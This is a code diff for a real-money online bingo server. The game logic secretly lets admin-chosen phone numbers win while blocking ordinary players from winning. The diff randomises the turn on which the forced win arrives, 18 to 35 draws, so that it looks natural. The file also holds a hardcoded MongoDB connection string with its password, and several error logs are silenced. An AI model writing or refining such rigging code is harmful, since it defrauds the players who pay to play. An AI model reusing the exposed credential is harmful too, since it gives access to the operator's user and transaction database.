@@ -23,13 +23,13 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(__dirname));
 
 // ==========================================
-// 🔵 DATABASE CONNECTION (🔥 MAX POOL SIZE ADDED FOR 40K USERS)
+// 🔵 DATABASE CONNECTION
 // ==========================================
 const mongoURI = process.env.MONGO_URI || "mongodb+srv://bingostream:T01%2F22%2F2005t@cluster0.hefpgl6.mongodb.net/BingoDB?retryWrites=true&w=majority";
 mongoose.connect(mongoURI, { autoIndex: true, maxPoolSize: 500 }).then(() => console.log("✅ Database Connected")).catch(err => console.log(err));
 
 // ==========================================
-// 🔵 MODELS (🔥 OPTIMIZED WITH INDEXES 🔥)
+// 🔵 MODELS
 // ==========================================
 const User = mongoose.model('User', new mongoose.Schema({
     phone: { type: String, required: true, unique: true, index: true },
@@ -122,6 +122,25 @@ const SystemSettings = mongoose.model('SystemSettings', new mongoose.Schema({
     forcedWinnerPhones: { type: String, default: "" }
 }));
 
+// 🔥 አሁን የተጨመሩት ሞዴሎች (Crash እንዳያደርግ) 🔥
+const SystemLog = mongoose.model('SystemLog', new mongoose.Schema({
+    phone: String,
+    actionType: String,
+    details: String,
+    severity: String,
+    date: { type: Date, default: Date.now }
+}));
+
+const SupportMessage = mongoose.model('SupportMessage', new mongoose.Schema({
+    telegramId: String,
+    phone: String,
+    name: String,
+    text: String,
+    sender: String,
+    isRead: { type: Boolean, default: false },
+    date: { type: Date, default: Date.now }
+}));
+
 let GLOBAL_SETTINGS = {};
 async function loadSettings() {
     let s = await SystemSettings.findOne();
@@ -178,7 +197,6 @@ async function isSmsAlreadyUsed(userInputSms) {
     return !!inTxRef;
 }
 
-// 🔥 40k Users Limit implemented to avoid crash
 async function autoApprovePendingDeposits() {
     try {
         const pendingTxs = await Transaction.find({ type: 'deposit', status: 'Pending' }).limit(500);
@@ -231,7 +249,7 @@ async function autoApprovePendingDeposits() {
                 }
             }
         }
-    } catch (err) { console.log("Auto-Approve Error:", err); }
+    } catch (err) {}
 }
 
 app.post('/api/webhook/iphone-sms', async (req, res) => {
@@ -259,7 +277,6 @@ app.post('/api/register', async (req, res) => {
         const { phone, name, password, refCode } = req.body;
         if (await User.findOne({ phone })) return res.json({ success: false, message: "ይህ ስልክ ቁጥር ተመዝግቧል!" });
         let actualRef = "";
-        
         let cleanRefCode = refCode || "";
         let isPromoLink = false;
         
@@ -387,15 +404,11 @@ app.post('/api/claim-promo-code', async (req, res) => {
         if(!user) return res.json({success: false, message: "User not found!"});
         
         let promo = await PromoCode.findOne({ code: code.toUpperCase() });
-        if (!promo) {
-            return res.json({ success: false, message: "ትክክለኛ ያልሆነ ኮድ!" });
-        }
+        if (!promo) return res.json({ success: false, message: "ትክክለኛ ያልሆነ ኮድ!" });
         
         if (new Date(promo.expiresAt) < new Date()) return res.json({ success: false, message: "የዚህ ኩፖን ጊዜ አልፏል!" });
         if (promo.currentUses >= promo.maxUses) return res.json({ success: false, message: "ይቅርታ! ይህ ኩፖን በሌሎች ሰዎች ሙሉ በሙሉ ጥቅም ላይ ውሏል።" });
-        if (promo.usedBy.includes(user.phone)) {
-            return res.json({ success: false, message: "እርስዎ ይህንን ኩፖን ቀድመው ወስደዋል!" });
-        }
+        if (promo.usedBy.includes(user.phone)) return res.json({ success: false, message: "እርስዎ ይህንን ኩፖን ቀድመው ወስደዋል!" });
         
         promo.usedBy.push(user.phone);
         promo.currentUses += 1;
@@ -506,7 +519,7 @@ app.post('/api/admin/finance-stats', financeAuth, async (req, res) => {
         let netProfit = tProf - totalBonusPaid - tPromoterPaid;
 
         res.json({ success: true, stats: { tDep, tWit, netCash, tTurnover, tWinnings, tProf, totalBonusPaid, tPromoterPaid, liability, netProfit } });
-    } catch (e) { console.log(e); res.status(500).json({ success: false }); }
+    } catch (e) { res.status(500).json({ success: false }); }
 });
 
 app.post('/api/admin/users', auth, async (req, res) => {
@@ -1147,6 +1160,7 @@ let globalTakenTickets = [];
 // 🔥 Mid-game locking mechanism for Forced Winners 🔥
 let midGameChosenRigged = null;
 let recentRiggedWinners = []; 
+let targetWinTurn = 0; // 🔥 Random Win Turn between 18 and 35 🔥
 
 function serverCheckBingo(grid, called) {
     let m = Array(5).fill().map(() => Array(5).fill(false));
@@ -1250,6 +1264,7 @@ function resetToWaiting() {
     calledNumbers = []; currentDrawSequence = [];
     gameId = Math.floor(Math.random() * 9000) + 1000; globalTakenTickets = []; io.emit('update_taken_tickets', globalTakenTickets); 
     midGameChosenRigged = null; 
+    targetWinTurn = 0; 
 }
 
 setInterval(() => {
@@ -1263,6 +1278,9 @@ setInterval(() => {
                 gameState = "PLAYING"; gameClock = 3; 
                 currentDrawSequence = getRiggedSequence(); 
                 midGameChosenRigged = null;
+                // 🔥 Pick a random turn between 18 and 35 for the rigged win 🔥
+                targetWinTurn = Math.floor(Math.random() * (35 - 18 + 1)) + 18;
+                
                 io.emit('game_status', { state: gameState, timer: gameClock, totalPrizePool, totalTickets, ticketPrice: GLOBAL_SETTINGS.ticketPrice, calledNumbers, playersCount: Object.keys(activePlayers).length, gameId, maxTickets: GLOBAL_SETTINGS.maxTicketsPerUser, depBannerTextAm: GLOBAL_SETTINGS.depBannerTextAm, depBannerTextEn: GLOBAL_SETTINGS.depBannerTextEn, witBannerTextAm: GLOBAL_SETTINGS.witBannerTextAm, witBannerTextEn: GLOBAL_SETTINGS.witBannerTextEn, minWithdrawLimit: GLOBAL_SETTINGS.minWithdrawLimit });
             } else { 
                 gameClock = GLOBAL_SETTINGS.gameTimer; 
@@ -1274,7 +1292,7 @@ setInterval(() => {
             gameClock = 3; 
             if (currentDrawSequence.length === 0) { resetToWaiting(); return; } 
             
-            // 🌟 MID-GAME DYNAMIC RIGGING LOGIC (Natural Delay & Anti-Repeat) 🌟
+            // 🌟 MID-GAME DYNAMIC RIGGING LOGIC (Natural Delay & Strict Solo-Win Check) 🌟
             let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones ? GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim()).filter(p => p) : [];
             let isRiggedGame = false;
 
@@ -1300,8 +1318,8 @@ setInterval(() => {
             let num;
 
             if (isRiggedGame && midGameChosenRigged) {
-                // 1. Force the numbers ONLY after 25 natural draws (Makes it look very real)
-                if (calledNumbers.length >= 25) {
+                // 1. Force the numbers ONLY after targetWinTurn natural draws (Randomly 18 to 35)
+                if (calledNumbers.length >= targetWinTurn) {
                     let targetTicket = activePlayers[midGameChosenRigged].ticketsData[0]; 
                     let neededNumbers = [
                         targetTicket.grid[0][2],
@@ -1321,7 +1339,7 @@ setInterval(() => {
                     }
                 }
 
-                // 2. Draw a number, BUT PREVENT normal players from winning
+                // 2. Prevent normal players from winning (STRICT SOLO-WIN LOGIC)
                 let validIndex = -1;
                 for (let i = 0; i < currentDrawSequence.length; i++) {
                     let testNum = currentDrawSequence[i];
@@ -1342,7 +1360,7 @@ setInterval(() => {
                         }
                     }
 
-                    // Pick this number if it makes the rigged player win OR if it makes nobody win
+                    // Pick this number if it makes the rigged player win OR if it makes nobody win.
                     if (riggedWins || !nonRiggedWins) {
                         validIndex = i;
                         break;
@@ -1352,18 +1370,19 @@ setInterval(() => {
                 if (validIndex !== -1) {
                     num = currentDrawSequence.splice(validIndex, 1)[0];
                 } else {
-                    // Rare fallback
+                    // Fallback (Rare case)
                     num = currentDrawSequence.shift();
                 }
 
             } else {
-                // Normal Random Game
+                // 🔥 NORMAL RANDOM GAME 🔥 (No forcing, just pick the next random ball)
                 num = currentDrawSequence.shift(); 
             }
 
             calledNumbers.push(num); 
             io.emit('new_number', num);
             
+            // Check for winners
             let winnersThisRound = [];
             for (let player of Object.values(activePlayers)) {
                 for (let ticket of player.ticketsData) { 
